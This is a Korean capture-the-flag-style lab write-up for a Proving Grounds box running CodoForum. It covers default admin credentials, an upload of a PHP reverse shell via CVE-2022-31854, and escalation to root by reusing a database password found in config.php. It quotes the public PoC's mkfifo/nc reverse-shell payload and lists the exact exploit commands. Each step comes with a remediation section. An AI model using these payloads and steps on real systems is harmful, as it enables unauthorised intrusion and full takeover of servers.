---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/default-creds
  - tech/web/file-upload
  - tech/cred/reuse
  - tech/payload/revshell
type: machine
platform: pg
os: linux
ip: 192.168.243.23
ports: [22, 80]
services: [http, ssh]
cves: [CVE-2022-31854]
status: solved
manual_tags: true
manual_cves: true
tech_count: 4
---

> [!info] 요약
> 타겟 `192.168.243.23` · Ubuntu 20.04 focal(호스트명 `codo`, 커널 5.4.0-150-generic) · Fundamental · 플래그 1개(`proof.txt` 만)
> 진입점: 80 CodoForum(CODOLOGIC) → `/admin/index.php` 기본 자격증명 `admin:admin` → Global Settings(`?page=config`)의 「포럼 로고」 업로드 필드에 PHP 리버스셸 `payload.php` 업로드(CVE-2022-31854) → `sites/default/assets/img/attachments/payload.php` 호출 → `www-data`
> 권한상승: `sites/default/config.php` 의 DB 비밀번호 `FatPanda123` 이 root 비밀번호로 재사용됨 → `su root`
> 시행착오·교훈 → [[_PLAYBOOK]]

## Target #1 – 192.168.243.23

### Initial Access – CodoForum 관리자 기본 자격증명으로 로그인해 로고 업로드 필드에 PHP 웹셸을 올려 원격 코드 실행

**Vulnerability Explanation:**
- 관리자 계정이 `admin:admin` 기본값 그대로 방치됨 — CWE-1392(Use of Default Credentials). CVE 가 붙는 코드 결함이 아니라 설치 시 오설정임
- CodoForum v5.1 Global Settings 화면(`/admin/index.php?page=config`)의 「포럼 로고」 업로드 필드가 `.php` 를 그대로 받아 저장 — CVE-2022-31854(인증 후 임의 파일 업로드 → RCE)
- 저장 위치 `sites/default/assets/img/attachments/` 가 웹루트 아래이고 그 디렉터리에서 PHP 실행이 차단돼 있지 않음 — 업로드가 곧 코드 실행이 됨
- 같은 설정 화면이 게시글 첨부 확장자 화이트리스트(`jpg,jpeg,png,gif,pjpeg,bmp,txt`)를 함께 다루나 로고 필드에는 걸리지 않음. **실측으로 확인된 것은 「`.php` 가 저장되고 실행됐다」까지임** — 화이트리스트가 로고 경로에 왜 미적용인지는 소스 미확인 `[가정]`

**Vulnerability Fix:**
- 설치 마법사에서 약한 비밀번호를 거부하고 기본 계정 첫 로그인 시 변경을 강제할 것. 관리 경로(`/admin`)에 IP 제한·MFA 추가
- 업로드 디렉터리에서 스크립트 실행을 차단할 것 — 가장 값싼 조치임. `php_admin_flag engine off` · `Options -ExecCGI` · `AddType text/plain .php .phtml .php5 .phar`. 더 나은 방법은 업로드물을 웹루트 밖에 두고 스크립트로 중계하는 것
- 업로드 시 확장자·MIME·매직바이트를 모두 검증하고 서버가 파일명을 재생성할 것
- CVE-2022-31854 의 벤더 패치 버전은 **확인하지 못함** — 「v5.2 이상으로 올릴 것」이라고 단정하지 말 것

**Severity:** High — 인증 후 RCE. 다만 그 인증이 기본 자격증명으로 통과되므로 실질 난이도는 무인증에 가까움

**Steps to reproduce the attack:**
1. 전 포트 스캔 → 22·80 만 개방
2. 80 의 `http-title` `All topics | CODOLOGIC` 로 제품을 CodoForum 으로 식별 → `searchsploit codo` 로 `CodoForum v5.1 - Remote Code Execution (RCE)`(EDB 50978 · CVE-2022-31854) 확보
3. `/admin/index.php` 에 `admin:admin` 로그인
4. Kali 에서 `rlwrap nc -lnvp 4444` 리슨
5. Global Settings(`?page=config`)의 「Upload logo for your forum」 필드에 PHP 리버스셸 `payload.php` 업로드
6. `http://192.168.243.23/sites/default/assets/img/attachments/payload.php` 호출 → `www-data` 셸 회수

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.243.23 | TCP: 22, 80 |

```bash
┌──(kali㉿kali)-[~/PG/Codo]
└─$ nnmap 192.168.243.23
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-18 16:02 +0900
Nmap scan report for 192.168.243.23
Host is up (0.084s latency).
Not shown: 65533 filtered tcp ports (no-response)
Bug in http-generator: no string output.
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-title: All topics | CODOLOGIC
|_http-server-header: Apache/2.4.41 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (97%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6.0
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 3.4 - 3.10 (91%), Linux 4.15 (91%), Linux 2.6.32 - 3.10 (91%), Linux 4.19 - 5.15 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   83.98 ms 192.168.45.1
2   83.94 ms 192.168.45.254
3   84.59 ms 192.168.251.1
4   84.63 ms 192.168.243.23

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.27 seconds

```
— 출처: 대화형 Kali 터미널 캡처. 같은 스캔의 파일 사본이 `~/PG/Codo/nmap.log`

`nnmap` 은 오타가 아니라 별칭임. 로그 파일 첫 줄이 확장 결과를 그대로 담고 있음:

```text
# Nmap 7.98 scan initiated Tue Aug 18 16:02:41 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.243.23
```
— 출처: `~/PG/Codo/nmap.log` 1행 · 별칭 정의는 `~/.zshrc:247`

즉 배너(`-sV`)·NSE(`-sC`)·OS 탐지(`-A`)·전 포트(`-p-`)·`TRACEROUTE` 가 전부 이 한 줄에서 나옴.

**버전 판정 — OS 는 독립 근거 2개, 제품 버전은 1개뿐**

- `OpenSSH 8.2p1 Ubuntu 4ubuntu0.7` — 패키지 리비전이 배포판을 확정함. Ubuntu 20.04 focal
- `Apache httpd 2.4.41 ((Ubuntu))` — 2.4.41 도 focal 기본 패키지. 두 배너가 서로를 확증
- 셸 획득 후 배너의 `Linux codo 5.4.0-150-generic #167-Ubuntu` 가 세 번째 근거가 됨
- ⚠️ `Warning: OSScan results may be unreliable` + `Running (JUST GUESSING)` — 열린 포트만 있고 닫힌 포트가 없어 OS 지문이 무의미함. **`MikroTik RouterOS 97%` 는 버릴 값임**(자동 판정 일반론은 [[_PLAYBOOK#A-11. 자동 도구가 뱉은 값이 의심스럽다]])

**제품 식별 — CODOLOGIC = CodoForum**

`http-title` 의 `CODOLOGIC` 이 PHP 포럼 CodoForum 의 벤더명임. 셸 획득 후의 웹루트 구조가 이를 확증:

```text
/var/www/html/sites/default/{config.php, constants.php, themes, plugins, locale, logs, assets}
```

`config.php` 안의 `IN_CODOF`·`get_codo_db_conf()`·`@CODOLICENSE` 가 코드 수준 근거임.

⚠️ **제품 버전은 타겟에서 직접 읽지 못했음.** 근거는 ① `searchsploit codo` 결과 중 로고 업로드 → `attachments/` 경로와 일치하는 것이 v5.1 RCE 하나뿐 ② 그 경로가 실제로 통함 — 두 개 다 간접이고 화면·파일에서 버전 문자열을 확인한 기록은 없음 `[가정]`. `readme.txt` 가 웹루트 `sites/default/` 에 실재했으므로(`Privilege Escalation` 절의 `ls` 출력) 웹으로도 노출됐을 가능성이 있으나 **시도한 기록 없음**.

> [!danger] 포트가 22·80 뿐이면 공격면은 웹 하나다
> OpenSSH 8.2p1 에 **무인증 원격 코드 실행으로 알려진 것 없음.** 사용자 열거 CVE-2018-15473 은 **7.7 이하 해당이고 7.8 에서 수정**돼 이 버전은 대상 밖임. SSH 는 자격증명이 생긴 뒤에 쓸 문이지 진입점이 아님.
> 즉 **80 하나에 시간을 쓴다**는 판단을 스캔 45초 만에 내릴 수 있음.

**디렉터리 열거 — 기록 없음**

`/admin/index.php` 에 어떻게 도달했는지는 산출물에 남아 있지 않음. `~/PG/Codo/` 에 gobuster·feroxbuster 로그가 없고 `~/.zsh_history` 에도 열거 명령이 없음.

시간만 복원됨 — `nmap.log` 16:03:26 → `50978.py` 회수 16:24:49 사이 **21분**이 그 구간임 `[가정]`. 참고로 EDB 50978 소스 자체가 세 경로를 전부 알려줌(`/admin/?page=login` · `/admin/index.php?page=config` · `/sites/default/assets/img/attachments/`).

### Initial Access – 로고 업로드 → 웹셸

제품이 확정되면 exploit-db 를 먼저 훑음.

```text
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
CodoForum 2.5.1 - Arbitrary File Download     | php/webapps/36320.txt
CodoForum 3.2.1 - SQL Injection               | php/webapps/40150.txt
CodoForum 3.3.1 - Multiple SQL Injections     | php/webapps/37820.txt
CodoForum 3.4 - Persistent Cross-Site Scripti | php/webapps/40015.txt
Codoforum 4.8.3 - 'input_txt' Persistent Cros | php/webapps/47886.txt
Codoforum 4.8.3 - Persistent Cross-Site Scrip | php/webapps/47876.txt
CodoForum v5.1 - Remote Code Execution (RCE)  | php/webapps/50978.py
Qcodo Development Framework 0.3.3 - Full Info | php/webapps/16116.txt
```
— 출처: `ssh kali@10.44.44.128 "searchsploit codo"` (2026-08-26 재실행)

```bash
searchsploit -m 50978
python 50978.py -h
searchsploit codologic
searchsploit codo
ls
python 50978.py
python 50978.py -t http://192.168.243.23 -u admin -p admin -i 192.168.45.207 -n 4444
```
— 출처: `~/.zsh_history` 2300~2306행 전량(대화형 세션, 타임스탬프 없음). 바로 앞 2297~2299행이 `mkdir Codo` · `cd Codo` · `nnmap 192.168.243.23` 임. `50978.py` mtime 2026-08-18 16:24:49

PoC 헤더가 대상과 CVE 를 명시함:

```python
# Exploit Title: CodoForum v5.1 - Remote Code Execution (RCE)
# Date: 06/07/2022
# Exploit Author: Krish Pandey (@vikaran101)
# Vendor Homepage: https://codoforum.com/
# Software Link: https://bitbucket.org/evnix/codoforum_downloads/downloads/codoforum.v.5.1.zip
# Version: CodoForum v5.1
# Tested on: Ubuntu 20.04
# CVE: CVE-2022-31854
```
— 출처: `~/PG/Codo/50978.py` 헤더 주석 전량

PoC 가 알려주는 것은 **어느 필드에 무엇을 올려 어느 경로로 부르는가** 셋임:

```python
loginURL = options.target + '/admin/?page=login'
globalSettings = options.target + '/admin/index.php?page=config'
payloadURL = options.target + '/sites/default/assets/img/attachments/'
```
— 출처: `~/PG/Codo/50978.py`

업로드 파트는 Global Settings 폼을 통째로 재전송하면서 `forum_logo` 파일 필드만 `.php` 로 바꾼 것임:

```text
Content-Disposition: form-data; name="forum_logo"; filename="' + randomFileName + '.php"
Content-Type: application/x-php

<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ' + options.ip + ' ' + options.port + ' >/tmp/f");?>
```
— 출처: `~/PG/Codo/50978.py` `uploadAndExploit()` 의 `send_payload` 문자열. 소스에서는 한 줄이고 `\n` 이 이스케이프로 들어 있음 — 여기서는 줄바꿈으로 펼쳐 실었음

**실제로 셸을 잡은 것은 이 PoC 가 아니라 같은 필드를 브라우저로 수동 업로드한 것임 `[가정]`.** 근거 셋:

- PoC 는 파일명을 소문자 10자 난수(`randomFileName`)로 생성하는데, 실제 경로와 스크린샷에 남은 이름은 **`payload.php`** 로 고정임
- PoC 의 페이로드는 `mkfifo` + `nc` 인데, 회수된 셸의 배너는 `uname -a` → `w` → `id` 순서임 — pentestmonkey `php-reverse-shell.php` 의 `$shell = 'uname -a; w; id; /bin/sh -i';` 실행 결과와 일치(칼리 `/usr/share/webshells/php/php-reverse-shell.php:54`). 다만 배너 뒤의 `bash:` 에러와 `www-data@codo:/$` 프롬프트는 bash 라 `/bin/sh` 를 `/bin/bash` 로 고친 판본이었을 것 `[가정]`
- PoC 는 로그인·업로드·실행 요청 전부에 `proxies=proxy` 를 붙이는데 그 `proxy` 가 `127.0.0.1:8080`(Burp) 하드코딩임 — Burp 없이 그대로 돌리면 죽음. 이 함정의 일반화는 [[_PLAYBOOK#A-14. 공개 PoC는 실행 전에 소스를 읽는다]]

수동 업로드 화면. 좌측 「Upload logo for your forum」 현재 값이 `codoforum_logo.png`, 파일 선택란에 `payload.php` 가 물려 있음. 주소창은 `192.168.243.23/admin/index.php?page=config`:

![[Pasted image 20260818163517.png]]
— 출처: `파일보관\Pasted image 20260818163517.png` (파일명 시각 2026-08-18 16:35:17)

**리스너를 먼저 띄울 것.** 순서를 뒤집으면 페이로드가 `Connection refused` 로 죽고 「웹셸이 안 먹힌다」는 잘못된 결론에 도달함.

- `rlwrap` — readline 래핑. 방향키 히스토리·백스페이스가 살아남. 빼면 `^[[A` 가 그대로 찍혀 오타를 못 고침
- `-l` 리슨 · `-n` DNS 역조회 안 함(빼면 접속 순간 수 초 멈춤) · `-v` 접속 정보 출력 · `-p 4444` 포트

페이로드 호출 URL:

```text
http://192.168.243.23/sites/default/assets/img/attachments/payload.php
```

호출하면 페이지가 멈춘 것처럼 보이는데 정상임 — 리버스셸이 붙어 있는 동안 PHP 요청이 끝나지 않기 때문임.

```bash
┌──(kali㉿kali)-[~/PG/Codo]
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.243.23] 34576
Linux codo 5.4.0-150-generic #167-Ubuntu SMP Mon May 15 17:35:05 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 07:35:51 up 36 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (1112): Inappropriate ioctl for device
bash: no job control in this shell
www-data@codo:/$ whoami
whoami
www-data

```
— 출처: 대화형 Kali 터미널 캡처(원본 노트에 보존된 유일한 셸 기록). 리스너 명령 자체는 `~/.zsh_history` 2326~2327행에 `cd Codo` → `rlwrap nc -lnvp 4444` 로 남아 있어 작업 디렉터리와 포트가 프롬프트와 일치함

배너의 `07:35:51`(타겟 UTC) = KST 16:35:51 이고 위 스크린샷은 16:35:17 임 — **34초 차이**로 업로드 화면과 셸 회수가 이어짐. `up 36 min` 을 역산하면 인스턴스 기동은 15:59 경으로 nmap 시작(16:02:41)과도 맞음.

- `connect to [192.168.45.207] from ... [192.168.243.23] 34576` — 왼쪽이 Kali tun0, 오른쪽이 타겟과 타겟 소스 포트
- `bash: cannot set terminal process group` / `no job control` 은 에러가 아니라 **PTY 가 없다**는 뜻임. 명령은 정상 실행되고 같은 블록의 `whoami` 가 실제로 동작함
- 명령이 두 번 찍히는 것은 에코가 **두 군데**에서 나기 때문임 — ① 리스너 쪽 로컬 터미널(`rlwrap nc`)이 타이핑한 줄을 그대로 보여주고, ② PTY 없는 `bash -i` 가 **읽은 줄을 스스로 되찍음**. ②는 Kali 에서 재현됨 — `printf 'whoami\nexit\n' | bash -i` 가 `cannot set terminal process group` · `no job control` 을 낸 뒤 프롬프트 뒤에 `whoami` 를 한 번 더 출력함
- `Password:` 뒤에 비밀번호가 평문으로 보이는 것은 ①뿐임 — 그 줄은 `su` 가 stdin 에서 직접 소비하므로 ②가 안 걸림. **원격이 비밀번호를 노출한 것이 아니라 내 화면에서 난 에코임**

**Local.txt value:**
**없음.** 이 박스는 포털 플래그 슬롯이 `1/1`(출처: `03. PG\_AUDIT\portal-진행도-실측-20260820.md` — `Codo(1/1)`)이고 root 의 `proof.txt` 하나만 존재함. 사용자 단계 플래그가 별도로 있는 구조가 아님 — Fundamental 난이도의 단일 플래그 박스임. ⚠️ 플래그 전수 탐색(`harvest.sh`)을 돌린 기록은 없음 — 근거는 포털 슬롯 수와 원본 기록임 `[가정]`.

### Privilege Escalation – 자격증명 재사용 (웹앱 DB 비밀번호 → root)

**Vulnerability Explanation:**
- 웹루트 아래 `sites/default/config.php` 가 MySQL 자격증명 `codo` / `FatPanda123` 을 평문으로 담고 있음 — CWE-522(Insufficiently Protected Credentials). `www-data` 로 셸을 잡으면 그대로 읽힘
- 그 DB 비밀번호가 **시스템 root 비밀번호와 동일**함 — 자격증명 재사용. 익스플로잇도 컴파일도 SUID 사냥도 없이 `su root` 한 줄로 끝남
- root 계정에 비밀번호 로그인이 살아 있어 `su` 가 성립함

**Vulnerability Fix:**
- 설정 파일을 웹루트 밖(`/etc/codoforum/`)으로 옮기고 값은 환경변수·시크릿 관리자에서 주입할 것. 파일 권한 `640 root:www-data`
- 계정마다 고유한 무작위 비밀번호를 쓸 것 — 이 박스에서 root 를 내준 유일한 원인임
- `passwd -l root` 로 root 비밀번호 로그인을 잠그고 `sudo` 만 사용할 것. 그러면 `su root` 자체가 성립하지 않음
- 애플리케이션 DB 계정에서 `FILE`·`SUPER`·`GRANT` 를 회수할 것

**Severity:** Critical — 평문 저장 자격증명 재사용으로 즉시 root 획득

**Steps to reproduce the attack:**
1. `id` 로 `uid=33(www-data)` 확인 — 특수 그룹 없음
2. 웹루트 `/var/www/html/sites/default/` 열거 → `config.php` 확인
3. `cat config.php` → MySQL 자격증명 `codo` / `FatPanda123`
4. `su root` 에 같은 비밀번호 입력
5. `cd` 로 `/root` 이동 → `cat proof.txt`

`id` 가 `uid=33(www-data) gid=33(www-data) groups=33(www-data)` 라 그룹 기반 경로(docker·lxd·disk·adm·sudo)가 전부 닫힘.

**`www-data` 로 떨어졌으면 SUID·크론보다 웹루트가 먼저임.** 웹 서비스 계정은 SUID·크론이 걸릴 일이 거의 없고, 대신 애플리케이션 설정 파일 전체를 읽을 수 있음. 열거 순서 일반론은 [[_PLAYBOOK#A-41. 셸은 잡았는데 권한상승 실마리가 없다]].

```bash
www-data@codo:/var/www/html/sites/default$ ls
ls
assets
config.php
config.php.example
constants.php
locale
logs
plugins
readme.txt
themes
```
— 출처: 대화형 Kali 터미널 캡처

- `config.php` — 본체
- `config.php.example` — 배포본 원본. `diff` 로 관리자가 무엇을 바꿨는지가 드러남
- `readme.txt` — 버전이 적혀 있을 후보. 앞서 못 박지 못한 제품 버전을 여기서 확정할 수 있었음(열어본 기록 없음)
- `logs/` — LFI 가 있었다면 로그 포이즈닝 대상
- `plugins/`·`themes/` — 로고 업로드 말고 다른 RCE 경로의 목적지

```bash
www-data@codo:/var/www/html/sites/default$ cat config.php
cat config.php
<?php

/*
 * @CODOLICENSE
 */

defined('IN_CODOF') or die();

$CF_installed=true;

function get_codo_db_conf() {


    $config = array (
  'driver' => 'mysql',
  'host' => 'localhost',
  'database' => 'codoforumdb',
  'username' => 'codo',
  'password' => 'FatPanda123',
  'prefix' => '',
  'charset' => 'utf8',
  'collation' => 'utf8_unicode_ci',
);

    return $config;
}

$DB = get_codo_db_conf();

$CONF = array (

  'driver' => 'Custom',
  'UID'    => '631042af544ef',
  'SECRET' => '631042af544f0',
  'PREFIX' => ''
);
```
— 출처: 대화형 Kali 터미널 캡처

| 값 | 무엇에 쓰는가 |
|---|---|
| `'username' => 'codo'` | MySQL 계정명. 동시에 OS 계정 후보 — `/etc/passwd` 에 `codo` 가 있는지 확인 대상 |
| `'password' => 'FatPanda123'` | 이 박스의 열쇠 |
| `'host' => 'localhost'` | DB 가 로컬. 3306 이 nmap 에 안 잡힌 것과 일치. 쓰려면 셸 안에서 `mysql -u codo -p` |
| `'database' => 'codoforumdb'` | 포럼 사용자 해시가 있는 곳 — 재사용 후보의 또 다른 공급원 |
| `UID`/`SECRET` | 애플리케이션 내부 식별자. 이 박스에서는 불필요 |

`defined('IN_CODOF') or die();` 때문에 `http://192.168.243.23/sites/default/config.php` 를 웹으로 직접 열면 본문이 비어서 돌아옴 — 「파일이 없다」가 아니라 「PHP 가 파싱하고 즉시 종료했다」임. ⚠️ **이 박스에서 실제로 요청해 본 기록은 없음**(관측 없음). 같은 현상을 실제로 만난 것은 [[Crane]] 임.

```bash
www-data@codo:/var/www/html/sites/default$ su root
su root
Password: FatPanda123
whoami
root
pwd
/var/www/html/sites/default
cd
cat proof.txt
34f3ce7f6374b4993f09078273faa70c
```
— 출처: 대화형 Kali 터미널 캡처

> [!warning] `su` 는 PTY 를 요구하지 않는다 — `must be run from a terminal` 은 `sudo` 의 문구다
> 위 블록의 `su root` 는 **PTY 업그레이드 기록 없이**, `bash: no job control in this shell` 이 찍힌 그 셸에서 그대로 성립함.
> 비밀번호를 파이프로 먹여도 `Password:` 를 내고 stdin 에서 읽음:
> ```bash
> ssh kali@10.44.44.128 "echo 'wrongpass' | su root -c id"
> ```
> ```text
> Password: su: Authentication failure
> ```
> `su` 바이너리에 `must be run from a terminal` 문자열이 **없음.** `strings $(which su) | grep -i terminal` 이 돌려주는 것은 `--pty` 옵션 설명뿐임. 반면 같은 검사를 `sudo` 에 하면 그 문구가 나옴:
> ```text
> a terminal is required to read the password; either use ssh's -t option or configure an askpass helper
> ```
> — 출처: `ssh kali@10.44.44.128 "strings \$(which sudo) | grep -i 'a terminal is required'"`
> — 확인 환경: Kali, util-linux 2.41.2. 타겟(Ubuntu 20.04, util-linux 2.34)에서 직접 재현한 것은 아님 `[가정]`. 다만 **이 박스에서 PTY 없이 `su` 가 통한 것 자체가 같은 방향의 실측**임.

`su root` 와 `su - root` 의 차이 — `su root` 는 환경을 물려받아 `PWD` 가 그대로임(위 출력의 `pwd` 가 `/var/www/html/sites/default` 인 이유). `su - root` 는 로그인 셸이라 `/root` 로 이동하고 `PATH`·`HOME`·프로필이 root 것으로 새로 설정됨. 권한상승 후 `iptables`·`tcpdump` 가 `command not found` 면 `PATH` 를 안 물려받은 것이니 `su -` 를 쓰거나 `export PATH=$PATH:/usr/sbin:/sbin`.

출력의 `cd`(인자 없음)는 `$HOME` 으로 가는 것이고 root 의 `$HOME` 은 `/root` 라 바로 `cat proof.txt` 가 통함.

**재사용이 막혔다면 다음 후보 순서** — ① `su codo`(DB 사용자명과 같은 OS 계정, `/etc/passwd` 확인) ② `mysql -u codo -p'FatPanda123' codoforumdb` 로 사용자 테이블 덤프 → hashcat ③ `/etc/passwd` 쓰기 가능 여부 ④ SUID·capabilities 를 GTFOBins 와 대조 ⑤ 크론(`pspy`) ⑥ 커널 `5.4.0-150-generic`(최후 수단, 패닉 위험).

### Post-Exploitation

**Proof.txt value:**
`34f3ce7f6374b4993f09078273faa70c` (`/root/proof.txt`)

⚠️ **`whoami; id; hostname; hostname -I; date; cat /root/proof.txt` 한 화면 증거는 없음.** `Privilege Escalation` 절의 `su root` 블록(계정 전환 → `whoami` → `root` → `cat proof.txt`)이 남아 있는 유일한 기록임. 다만 **그 블록의 타겟 프롬프트 `www-data@codo:/var/www/html/sites/default$` 가 대화형 셸에서 읽었다는 증거**임 — 웹셸로 읽은 것이 아님. 시험 제출에는 이 형태로는 부족하므로 플래그 획득 시점에 한 화면을 통째로 찍는 습관을 들일 것.

**남긴 흔적**

| 항목 | 상태 |
|---|---|
| `/var/www/html/sites/default/assets/img/attachments/payload.php`(웹셸) | 남아 있음 — 랩 Stop/Revert 로 소멸 |
| CodoForum Global Settings 의 `forum_logo` 값이 `payload.php` 로 교체됨 | 남아 있음 |
| `auth.log` 의 `su` 성공 기록 | 남아 있음 |
| Kali 리스너·tmux | `rlwrap nc -lnvp 4444` 는 대화형 터미널에서 직접 종료. NFS 마운트 없음 |

획득 자격증명 — CodoForum 관리자 `admin` / `admin` · MySQL `codo` / `FatPanda123` · root / `FatPanda123`(재사용).

## 관련

- CVE-2022-31854 — CodoForum v5.1 인증 후 임의 파일 업로드 → RCE. PoC: exploit-db 50978 (`php/webapps/50978.py`)
- CWE-1392 Use of Default Credentials · CWE-434 Unrestricted Upload of File with Dangerous Type · CWE-522 Insufficiently Protected Credentials
- CodoForum(Codologic) 제품 확인 문자열 — `IN_CODOF` · `get_codo_db_conf()` · `@CODOLICENSE` · `sites/default/` 레이아웃
- pentestmonkey `php-reverse-shell.php` — 칼리 경로 `/usr/share/webshells/php/php-reverse-shell.php` (`$ip`·`$port` 수정 필수)
- PayloadsAllTheThings — Upload Insecure Files: <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files>
- GTFOBins: <https://gtfobins.github.io/>
- [[_PLAYBOOK#A-11. 자동 도구가 뱉은 값이 의심스럽다]] · [[_PLAYBOOK#A-13. 익스플로잇을 던지기 전에 버전과 CVE 표기를 검증한다]] · [[_PLAYBOOK#A-14. 공개 PoC는 실행 전에 소스를 읽는다]] · [[_PLAYBOOK#A-41. 셸은 잡았는데 권한상승 실마리가 없다]] · [[_PLAYBOOK#B-62. 자격증명은 인증 DB 가 아니라 «애플리케이션 데이터» 에 있다]]
- [[_PLAYBOOK#B-1-37. 로그인 폼을 만나면 기본 자격증명이 1순위 — 제품별 기본값 표]] · [[_PLAYBOOK#B-1-36. 인증 후 파일 업로드 → RCE — 조건 셋과 업로드 경로 찾기]] — 이 박스의 진입 경로 카드
- [[_PLAYBOOK#B-6-12. 평문 비밀번호를 하나 주우면 「이 조직이 쓰는 비밀번호」로 취급한다]] — 권한상승 경로 카드
- [[_PLAYBOOK#A-3-10. `su` 가 `must be run from a terminal` 로 거부된다 — 그러나 «항상» 그런 것은 아니다]] — PTY 없는 셸에서 `su root` 가 성립한 근거. 「`su` 는 PTY 를 요구한다」는 옛 서술이 여기서 반증됨
- [[Crane]] — SuiteCRM `admin:admin` → 인증 후 RCE → `config.php` 에서 DB 자격증명. 가장 가까운 쌍둥이
- [[Levram]] — Gerapy `admin:admin` → 인증 후 RCE → `app.service` 의 평문 root 비밀번호
- [[Exfiltrated]] — Subrion `admin:admin` → 업로드 확장자 우회(`.phar`)
- [[Fanatastic]] — 설정 파일 자격증명 재사용, DB 사용자명 = OS 계정명이라는 신호
- [[Robust]] — 평문 저장 자격증명 재사용으로 관리자 획득
- [[Hawat]] — Nextcloud `admin:admin`, PTY 업그레이드 대안, 아웃바운드 포트 제약
- [[Squid]] — 파일 쓰기로 웹셸을 심는 다른 경로
- [[_STATUS]] — 283개 전수 진행현황
